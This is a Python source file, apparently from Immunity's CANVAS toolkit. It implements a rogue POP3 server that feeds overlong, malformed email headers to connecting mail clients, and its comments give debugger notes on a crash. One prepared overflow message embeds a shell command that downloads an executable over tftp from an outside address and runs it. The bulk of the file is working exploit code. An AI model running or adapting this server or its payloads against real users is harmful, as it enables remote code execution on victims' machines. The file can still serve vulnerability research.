#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
simple pop3 server for CANVAS
Useful investigating mail client vulnerabilities.

"""
import sys
sys.path.append("..")
sys.path.append(".")

import exploitutils
import socket

class pop3server:
    """
    ref:
    http://www.xfocus.net/articles/200403/683.html
    
    Go through and crashes at 10004070 call
      which appears to be a kind of optimized strncpy?
      dest pointer is fucked up
      
      This is called from 10003fa1 - which already has the bad dest
      This in turn is called from 10002031. The edx at 2030 has our
      bad value (-1) already. :< - this is true even when we get into 
      url2local (10002060).
      
      url2local returns into 10002000
      
      
      
      mbrk at esp+230 (0012eae0)
      
      
      This is called from 0040238b
      
      
      We actually handle the intial bad deref, and then have another crash in the 
      handler where we return into some really bad area...
      
      our se handler is at 0049b1bd
      
      It would be cool if ollydbg hashed functions and could detect
      memcpy (and even cooler if you could submit hashes and names...
      0x100-1 is the boundry where it will crash.
      
      You cannot have an @ in your shellcode or the address at all.
      
      the mime filter seems to get rid of : and \ in names.
      
      multipart-signed starts at 
    
    """
    def __init__(self):
        self.port=110
        self.listenhost="0.0.0.0"
        self.message=""
        attackstring1="A"*200
        attackstring2="A"*510
        #self.message+="From: girl\x0d%s:%s\r\n"%(attackstring1,attackstring2)
        #self.message+="From: friend\r\%s:\r\n"%("A"*600)
        self.message+="From: %s\r\n"%("&*"*500)
        #self.message+="From: %s\r\n"%("\x54"*(0x104-4))
        self.message+="To: you@bob.com\r\n"
        self.message+="Subject: Something\r\n"
        #self.message+="X-PRIORITY: %s\r\n"%("A"*1300)
        #self.message+="\r\n"
        cnmessage="From: girl\x0dAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        cnmessage+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        cnmessage+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÌmd /c tftp -i"
        cnmessage+="192.168.1.101 get a.exe&a.exe:Íúëë òAAAA òAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        cnmessage+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        cnmessage+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        cnmessage+="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"
        cnmessage+="MIME-Version: 1.0\r\n"
        bob="""Content-Type: multipart/mixed; boundary="87122827"; 

--87122827
Content-Type: text/html;
Content-Disposition: inline

<html>
<head>

</head>

<body>
<div align="right"> 
<table border="4" cellpadding="0" cellspacing="0" width="680">
<font face="verdana" size="4">

<P>
hi!
</body>
</html>

--87122827


"""
        bob=bob.replace("\n","\r\n").replace("asdf","\r"*3000)
        
        #self.message=cnmessage
        self.message+=bob
        self.index=15
        return
    
    def log(self,message):
        print message
        return
    
    def handledata(self,data):
        print "Data=%s"%data
        command=data.split(" ")[0].upper()
        command=command.replace("\r","").replace("\n","")
        if command=="USER":
            return "+OK worked"
        elif command=="PASS":
            return "+OK worked"
        elif command=="STAT":
            return "+OK %s %s"%(str(self.index),len(self.message))
        elif command=="RETR":
            return "+OK %s octets\r\n%s\r\n."%(str(len(self.message)),self.message)
        elif command=="UIDL":
            return "+OK\r\n1 %4.4d2932.12\r\n."%(1074+self.index)
        elif command=="LIST":
            return "+OK 1 visible messages (%s octets)\r\n%s %s\r\n%s\r\n."%(len(self.message),self.index,len(self.message),self.message)
        elif command=="QUIT":
            return "+OK"
        return "+OK"
            

    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

        try:
            s.bind((self.listenhost, self.port))
            s.listen(5)
        except:
            self.log("Could not listen on that socket")
            return 0
        
        while 1:
            try:
                s.set_timeout(None)
                newsocket,addr=s.accept()
            except:
                #print "Exiting exploit"
                self.log("Exception occured during accept - likely we timed out.")
                s.close()
                break
            newsocket.send("+OK POP3 server ready\r\n")
            while 1:
                data=newsocket.recv(500) #USER 192.168.1.101 (oops)
                print "Data=%s"%data
                response=self.handledata(data)
                if response=="":
                    s.close()
                    break
                print "sending %s"%response
                newsocket.send("%s\r\n"%response)
                if data.count("QUIT"):
                    s.close()
                    break
            
            
if __name__=="__main__":
    print "pop3 server ..."
    pop=pop3server()
    pop.run()
